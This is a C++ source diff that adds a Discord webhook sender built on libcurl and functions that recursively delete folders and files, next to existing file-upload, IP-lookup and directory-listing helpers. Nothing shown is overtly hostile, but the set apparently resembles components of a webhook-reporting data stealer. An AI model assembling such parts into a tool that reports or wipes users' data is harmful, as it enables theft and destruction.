@@ -147,6 +147,34 @@ std::string func::upload_file(const std::string& file_path) {
 	return link;
 }
 
+void func::sendDiscordWebhook(const std::string& webhookUrl, const std::string& message)
+{
+	CURL* curl = curl_easy_init();
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, webhookUrl.c_str());
+		curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+		// Set the message payload
+		std::string jsonPayload = "{\"content\":\"" + message + "\"}";
+		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonPayload.c_str());
+
+		// Set the response callback function
+		std::string response;
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+		// Perform the HTTP request
+		CURLcode res = curl_easy_perform(curl);
+		if (res != CURLE_OK) {
+			std::cerr << "Failed to send Discord webhook: " << curl_easy_strerror(res) << std::endl;
+		}
+
+		// Clean up
+		curl_easy_cleanup(curl);
+	}
+}
+
+
 std::string func::GetIP()
 {
 	std::string ipAddress = "";
@@ -297,7 +325,8 @@ void func::GetFilesInDir(std::string directoryPath, std::string*& arr, int& arrS
 {
 
 	try {
-		for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
+		for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) 
+		{
 			if (std::filesystem::is_regular_file(entry)) {
 				std::string* arr2 = new std::string[arrSize + 1];
 				for (size_t i = 0; i < arrSize; i++)
@@ -315,7 +344,33 @@ void func::GetFilesInDir(std::string directoryPath, std::string*& arr, int& arrS
 			}
 		}
 	}
-	catch (const std::filesystem::filesystem_error& ex) {
+	catch (const std::filesystem::filesystem_error& ex) 
+	{
 		std::cerr << "Error accessing directory: " << ex.what() << std::endl;
+	}
+}
+
+bool func::deleteFolder(const std::string& folderPath)
+{
+	try {
+		std::filesystem::remove_all(folderPath);
+		return true;
+	}
+	catch (const std::filesystem::filesystem_error& error) 
+	{
+		std::cerr << "Failed to delete folder: " << error.what() << std::endl;
+		return false;
+	}
+}
+
+bool func::deleteFile(const std::string& filePath)
+{
+	try {
+		std::filesystem::remove(filePath);
+		return true;
+	}
+	catch (const std::filesystem::filesystem_error& error) {
+		std::cerr << "Failed to delete file: " << error.what() << std::endl;
+		return false;
 	}
 }
